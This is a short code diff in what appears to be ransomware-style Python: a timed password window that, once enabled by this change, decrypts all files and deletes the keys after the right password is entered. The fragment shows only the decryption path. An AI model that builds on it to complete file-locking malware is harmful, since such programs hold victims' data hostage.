@@ -70,7 +70,7 @@ def timer_window():
 
         if entered_password == password:
             result_label.config(text="Password correct. Decrypting...")
-            # decrypt_all_files()
+            decrypt_all_files()
             delete_keys()
             stop_flag.set()
             root.quit()
